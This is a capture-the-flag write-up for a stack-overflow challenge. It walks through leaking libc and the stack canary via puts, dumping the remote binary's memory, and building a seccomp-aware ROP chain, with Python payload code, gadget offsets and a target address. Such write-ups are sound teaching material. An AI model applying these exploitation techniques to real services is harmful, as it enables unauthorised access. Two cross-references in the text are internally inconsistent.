# PWN#001 — stack leak, canary, seccomp-blocked ROP

**Flag:** `CTF{ee6c8e12d8a68dcd220ebe010e2cfa4b}` · **Files:** `vault` (16 096 B, sha256 `e625122ad793b48527c39697b858eb459353cc9db2811f1d99d1af017bb7820b`), `libc.so.6` (2 014 472 B, sha256 `60e497ccae98697a7aa6299c2c1cc4c248a6fb901341d1a2ac0da6f7485e2f27`), `ld-linux-x86-64.so.2` (226 104 B, sha256 `035c045b59cffd2fbf9b4134ec064aee4764be65bdeb149ea6ad6127cea77702`) · **Target:** `169.58.126.107:5000`

## Challenge

The card reads `PWN#001`, 100 points, objective "Get a shell on the remote host and read the flag",
service at `169.58.126.107 5000`. Three artifacts are provided: the `vault` binary, `libc.so.6` and
`ld-linux-x86-64.so.2`.

Two differences between the stated objective and the inspected service:

- **`vault` is not the binary running on the remote.** It differs in function addresses, in the
  number of imports, and the remote build contains seccomp setup code that the artifact does not.
- **No interactive shell is possible.** The remote binary installs its own seccomp filter with
  `SECCOMP_RET_KILL` for `execve` (59) and `execveat` (322). The flag was recovered by reading
  `/flag/flag.txt` through ROP, not by getting a shell.

## Analysis

Triage on the artifact:

```bash
file vault
readelf -hW vault | grep -E 'Type|Entry'
readelf -lW vault | grep -E 'GNU_STACK|GNU_RELRO'
readelf -dW vault | grep -E 'NOW'
```

Result: `Type: EXEC` (non-PIE), `GNU_STACK... RW` (NX on), `GNU_RELRO` covering the whole `.got` plus
`FLAGS: BIND_NOW` (Full RELRO), and `__stack_chk_fail` present. The symbol table is intact and includes a
function named `gadgets`, the signature of a "hidden gadget" challenge:

```text
0x401205  58        pop rax
0x401206  48 97     xchg rdi, rax
0x401208  c3        ret
```

These instructions load a stack qword into `rdi` and return, while also clobbering `rax`: `pop rax` takes a value from the stack,
`xchg` moves it into `rdi`, and `ret` takes the next qword as RIP.

`vuln()` (artifact) has the structure that decides the whole attack:

```text
sub   rsp, 0x50                 ; buffer at rbp-0x50
mov   rax, fs:[0x28]
mov   [rbp-0x8], rax            ; canary at rbp-0x8
printf("Enter your name: ")
read(0, rbp-0x50, 0x49)          ; 73 byte
printf("Hello, ")
puts(rbp-0x50)                   ; prints up to the first null byte
printf("Leave a message ...")
read(0, rbp-0x50, 0x100)         ; 256 byte -> overflow
... canary check ... leave; ret
```

Offsets measured from the start of the buffer follow directly: **canary = 72, saved rbp = 80,
return address = 88**. `main` calls `vuln()` in an endless loop, so a single connection gives many
read/puts rounds.

Three consequences, all exploitable:

1. The second `read` is capped at 256 bytes, so the record is not null-terminated, and `puts` prints
   until it meets a `0x00` byte → **a primitive that prints stack contents**.
2. This glibc canary has a null low byte; little-endian storage places that byte at the lowest address. The first `read`
   allows 73 bytes = exactly 72 buffer bytes + 1 byte landing on that null byte.
3. `leave; ret` restores `rsp` from **the `rbp` register**, not from the value we write into the saved rbp
   slot. An incorrect saved-rbp value therefore does not break the handoff to our chain.

## Approaches tried

The full log is in `notes.md`; below are the dead ends actually tested, with the evidence against each.

1. **Using gadget addresses taken from `vault`** (`0x401205`, `puts@plt` at `0x401030`): the chain
   died right after `Message received.` even though the canary had been restored correctly (writing 80
   bytes keeps the loop alive, adding 8 more kills it — `payload-length-bisect.log`). Cause: the
   remote is a different build (see Step 3).
2. **Byte-by-byte canary brute force**: every connection is a fresh process; `libc base` and canary change
   constantly (`00b7ea…`, `00409d…`, `0090f7…`), with no observed shared canary across connections — unusable, and unnecessary once the
   leak below worked.
3. **GOT overwrite / `.fini_array` hijack**: `.got` lies entirely inside `GNU_RELRO` and `BIND_NOW` leaves no
   lazy binding for `ret2dl-resolve`. The solution uses ROP to read the file.
4. **Hardcoding `fd = 3` after `openat`**: `getdents64`/`read` on fd 3 either failed instantly or **blocked
   forever** (`fd-hardcode-fail.log`: `write` printed the untouched old buffer `.EEEE…`, i.e. nothing
   was read). The service already has fds open, so the newly opened file got a different number.
5. **Placing the command string at the start of the buffer** and pointing `rdi` there for `system(...)`:
   `puts` printed garbage instead of the command. The region `buf+0..71` sits **below** `rsp` and is
   overwritten by the stack frames of the libc functions called by the chain itself. Data the chain needs
   later must live **above** `rsp`.
6. **`system("/bin/sh")`**: a `puts("exit 0")` marker was placed after `system`, and it did print
   (`system-returns.log`) → `system()` **returned**; the forked child was killed at exec.
7. **Raw `execve` (59)**: the connection closed immediately with no output after `Message received.`
   (`execve-killed.log`) → consistent with `SECCOMP_RET_KILL`.

## Solution

The whole chain fits inside the 256 bytes of the message read; the final script is `getflag.py`.

**Step 1 - Two leaks from the same bug.**

libc leak: send an 8-byte name **with no newline**. `read` returns 8 bytes, `puts` keeps printing the
residue left on the stack and stops at a null byte. Position `buf+8` holds the `_IO_2_1_stdout_` pointer
left behind by `setup()` (which calls `setvbuf(stdin/stdout/stderr, NULL, _IONBF, 0)`); 6 bytes print:

```text
libc residue leak      b'\xc0\x85\x8c\x1f~\x7f'
stdout _IO_2_1_stdout_ 0x7f7e1f8c85c0
libc base              0x7f7e1f6e0000
```

`base = leaked - 0x1e85c0` (the offset of `_IO_2_1_stdout_` in `libc.so.6`).

Canary leak: send **exactly 73 bytes**, the last one non-zero (`'B'*72 + 'A'`). Byte 73 overwrites the
canary's null LSB, so `strlen` no longer stops there and `puts` prints the 7 canary bytes, then the saved rbp:

```text
canary leak raw        b7ea63e560954380a89efefd7f
canary                 00b7ea63e5609543
saved rbp              0x7ffdfe9ea880
```

The full canary is `b'\x00' + the 7 leaked bytes`. The following message read writes those 8 bytes back at
offset 72, with the ROP chain from offset 88 → the process passes `__stack_chk_fail` **and** keeps control of
RIP **within the same iteration**. If the process does die, it dies only after `puts` has printed, so leaking
and using happen on one connection.

**Step 2 - The absolute buffer address cannot be derived from the artifact.**

It is needed to place `argv`/scratch data. Measured empirically: write a marker into a high payload offset
(above `rsp`, therefore safe), then call `puts(L+d)` for several candidate `d` values in one chain:

```text
lines [b'', b'\xfe\xae\x88\xb7\xc4\x7f', b'{6\x897\x05m\x1d\xe1', b'ZMARKER123', b'']
*** MAPPING FOUND: puts(L+0x58) hit marker at offset 232 -> buffer = L - 0x90
```

(`marker-stack-mapping.log`). The distance is `0x90`, **not** the `0x70` the artifact implies,
because the remote `main` frame differs.

**Step 3 - Discovering that the remote is a different build, and re-measuring its addresses.**

Writing `p64(0x401301)` (the artifact's return address) at offset 88 kills the process, while leaving it
alone keeps it alive, so the real return address had to be read. Obstacle: its top five bytes are null, so
`puts` stops there. Trick: in one iteration, write the saved rbp with **its two upper null bytes replaced by
`0x41 0x41`** (a wrong saved-rbp value is harmless because `leave` uses the `rbp` register), letting `puts`
run past the return-address slot:

```text
iter3 leak 1a0a59c347ef8120ca17eefe7f4141c91340 len 18
saved rbp slot   = 20ca17eefe7f4141
ret addr bytes   = c91340 -> partial value 0x4013c9
```

(`retaddr-leak.log`). `0x4013c9` is the remote's loop-continue point. Dumping `.text` further showed
`vuln` at `0x401453`, `gadgets` at `0x4012c9`, and **7** PLT jump slots instead of 5.

**Step 4 - Turning the overflow into an arbitrary memory read.**

`write(1, addr, len)` needs no null and truncates nothing, providing a length-controlled memory read; ending the chain with a
`ret` to `0x4013c9` keeps the connection alive for many rounds:

```python
chain = (g(POP_RAX, 1) + g(POP_RDI, 1) + g(POP_RSI, addr) + g(POP_RDX, length) +
         p64(libc + SYSCALL) + p64(MAIN_LOOP))
```

From `remote_memdump.log` plus disassembly (`remote_disasm.txt`) three things decide the rest:

1. The function at `0x401186` builds a 5-instruction BPF program on the stack and calls
   `prctl(38,1,0,0,0)` (PR_SET_NO_NEW_PRIVS) then `prctl(22, 2, &prog)` (PR_SET_SECCOMP/SECCOMP_MODE_FILTER):

```text
   { code=0x20, k=0 }          ; BPF_LD|BPF_W|BPF_ABS seccomp_data.nr
   { code=0x15, jt=2, k=0x3b } ; nr == 59  (execve)   -> KILL
   { code=0x15, jt=1, k=0x142} ; nr == 322 (execveat) -> KILL
   { code=0x06, k=0x7fff0000 } ; SECCOMP_RET_ALLOW
   { code=0x06, k=0x00000000 } ; SECCOMP_RET_KILL
   ```

   `read`(0), `write`(1) and `openat`(257) are not in the blocked list — which explains exactly the
   observations 6 and 7 in "Eliminated Hypotheses".
2. The string `/flag/flag.txt` is **written byte by byte** by `main` into `.bss` at `0x404060` (which is why
   `strings` on the artifact shows nothing; the artifact does not even contain this code):

```text
   00404060  2f 66 6c 61 67 2f 66 6c 61 67 2e 74 78 74 00 00   /flag/flag.txt..
   ```
3. The gadget `xchg rdi, rax; ret` lives at **`0x4012e1`** (inside `gadgets`, with `pop rax` at `0x4012e0`).

The same dump gives a final libc confirmation: `0x404020/30/40` (the `stdout/stdin/stderr` copies) minus the
`libc base` return exactly `0x1e85c0 / 0x1e78e0 / 0x1e84e0`, i.e. `_IO_2_1_stdout_`, `_IO_2_1_stdin_` and
`_IO_2_1_stderr_` as found in `libc.so.6`. An earlier independent check: two residue pointers leaked in
the same connection differ by `0x8224a`, which falls strictly inside the symbol `puts` (`0x82060`, size 540).

**Step 5 - The flag-reading chain, 248/256 bytes.**

No hardcoded fd: let `xchg rdi, rax; ret` capture whatever `openat` actually returned. The scratch buffer sits
at `L + 0x200` (above `rsp`) so libc frames cannot clobber it:

```python
out = L + 0x200
chain = (g(POP_RDI, AT_FDCWD) + g(POP_RSI, PATH_ADDR) + g(POP_RDX, O_RDONLY) +
         g(POP_RAX, SYS_OPENAT) + p64(libc + SYSCALL) +
         p64(XCHG_RDI_RAX) +
         g(POP_RSI, out) + g(POP_RDX, 0x100) + g(POP_RAX, SYS_READ) +
         p64(libc + SYSCALL) +
         g(POP_RDI, out) + p64(libc + OFF_PUTS))
payload = b'E' * 72 + canary + p64(L) + chain
```

With `PATH_ADDR = 0x404060`, `XCHG_RDI_RAX = 0x4012e1`, and libc gadgets taken from `libc.so.6`:
`pop rdi; ret = 0x2a9b7`, `pop rsi; ret = 0x2a404`, `pop rdx; ret = 0x96372`, `pop rax; ret = 0x44386`,
`syscall; ret = 0x926e2`, `puts = 0x82060`.

Stack alignment: `rsp` at the entry of a libc call depends on how many qwords were popped beforehand, and
`vuln` hands back an 8-byte-stepped position. Evidence from the logs: the `system()` chain carried an extra
`ret` sled (`0x2a9b8`) and reached `system` (`system-returns.log`), while the final `puts` chain has
**no** sled and still printed the flag. If a libc call SIGSEGVs, toggle exactly one `ret` gadget at the head
of the chain; the configuration in `getflag.py` is the one that worked against the service.

**Step 6 - Verification.**

- Two independent connections, with completely different `libc base` and canary values, produced the same string.
- The bracketed content is 32 hex characters, matching flags of other challenges in this event.
- The printed content comes from the scratch region `L + 0x200`. Before `read` it held unrelated stack bytes;
  after `read` it holds the file bytes, and `puts` prints from there to the first null byte (ending with
  `\n\n` because `puts` appends a newline). The string appears in no artifact on disk.

## Reproduce

Requires: the service at `169.58.126.107:5000` still running (every `.text` address quoted here comes from the
remote's memory dump, so nothing has to be rebuilt), Python 3, and `libc.so.6` for offset comparison.

```bash
cd pwn001
python getflag.py
```

The script performs three rounds: leak `libc base` (8 bytes, no newline) → leak the canary (73 bytes) → send the
248-byte chain `openat("/flag/flag.txt") → xchg rdi,rax → read(fd, L+0x200, 0x100) → puts`. The remote service is no longer available, so the exploit cannot be rerun. The recorded leak sizes and chain are retained above.

To check the libc offsets locally without the service:

```bash
readelf -sW libc.so.6 | grep -E '_IO_2_1_stdout_|puts|read@@'
sha256sum vault libc.so.6 ld-linux-x86-64.so.2
```
